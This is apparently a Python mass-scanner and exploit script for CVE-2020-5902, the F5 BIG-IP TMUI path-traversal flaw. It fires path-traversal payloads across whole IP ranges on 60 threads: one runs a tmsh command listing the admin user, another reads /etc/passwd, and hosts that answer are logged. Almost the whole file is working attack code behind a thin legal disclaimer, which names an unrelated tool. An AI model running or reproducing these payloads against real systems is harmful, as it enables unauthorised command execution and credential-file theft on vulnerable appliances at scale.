import sys
import requests
from concurrent.futures import ThreadPoolExecutor
import time

# Autor:    MrCl0wn
# Blog:     http://blog.mrcl0wn.com
# GitHub:   https://github.com/MrCl0wnLab
# Twitter:  https://twitter.com/MrCl0wnLab
# Email:    mrcl0wnlab\@\gmail.com
#
#
# BIG-IP TMUI Remote Code Execution
# https://engineeringjobs4u.co.uk/helping-to-protect-against-the-f5-tmui-rce-vulnerability
# https://packetstormsecurity.com/files/158333/BIG-IP-TMUI-Remote-Code-Execution.html
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902
#
# WARNING
# +------------------------------------------------------------------------------+
# |  [!] Legal disclaimer: Usage of afdWordpress for attacking                   |
# |  targets without prior mutual consent is illegal.                            |
# |  It is the end user's responsibility to obey all applicable                  |
# |  local, state and federal laws.                                              |
# |  Developers assume no liability and are not responsible for any misuse or    |
# |  damage caused by this program                                               |
# +------------------------------------------------------------------------------+


COUNT_ROX = 0
TIME_OUT = 5
TIME_SLEEP = 3
COUNT_REQUEST = 0
MAX_CONECTION_THREAD = 60
XPL_LIST = [
    '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin',
    '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd',
    '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp',
    '/tmui/login.jsp/..;/tmui/util/getTabSet.jsp',
    '/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp',
    '/tmui/login.jsp/..;/tmui/locallb'
]

BANNER = '''\033[1;31m
     ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██████╗       ███████╗ █████╗  ██████╗ ██████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔═████╗      ██╔════╝██╔══██╗██╔═████╗╚════██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝██║██╔██║█████╗███████╗╚██████║██║██╔██║ █████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ████╔╝██║╚════╝╚════██║ ╚═══██║████╔╝██║██╔═══╝ 
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗╚██████╔╝      ███████║ █████╔╝╚██████╔╝███████╗
     ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝       ╚══════╝ ╚════╝  ╚═════╝ ╚══════╝
\t\033[1;37mchecker by: MrCl0wnLab\n\thttps://github.com/MrCl0wnLab\033[0m
'''

def save_value_file(value: str, file: str):
    myFile = open(file, 'a+')
    myFile.write(value)
    myFile.close()


def log_process(target, result):
    save_value = f"\"{target}\",\"{result}\"\n"
    if result == 200:
        print(f"[+] \033[1;32m{target}\033[0m",result)
        save_value_file(save_value, 'output.log')
    else:
        print(f"[x] \033[1;30m{target}\033[0m",result)
        save_value_file(save_value, 'error.log')


def send_request(url: str):
    try:
        if url:
            result_request = requests.get(url, verify=False, timeout=TIME_OUT)
            log_process(url, result_request.status_code)
    except Exception as err:
        return print(err)


def check_vuln(target: str):
    for xpl_pwd in XPL_LIST:
        result = send_request('http://'+target+xpl_pwd)
        time.sleep(TIME_SLEEP)
        if result:
            return result

# REF CODE: https://github.com/pootzko/tkit.dev/issues/21
def ipRange(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i-1] += 1
        ip_range.append(".".join(map(str, temp)))
    return ip_range


def start(ip_start, ip_end):
    try:
        IP_RANGE = ipRange(ip_start, ip_end)
        executor = ThreadPoolExecutor(max_workers=MAX_CONECTION_THREAD)
        executor.map(check_vuln, IP_RANGE)
        executor.shutdown(wait=True)
    except Exception as err:
        return print(err)


# Using as command line
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'{BANNER}\nUsage:')
        print(f'\tpython3.8 {sys.argv[0]} <ip_start> <ip_end>\n')
        print('e.g.')
        print(f'\tpython3.8 {sys.argv[0]} 192.168.15.1 192.168.15.86\n')
        sys.exit(0)
    rang_ip = sys.argv[1:]
    if rang_ip[0] and rang_ip[1]:
        print(BANNER)
        start(rang_ip[0], rang_ip[1])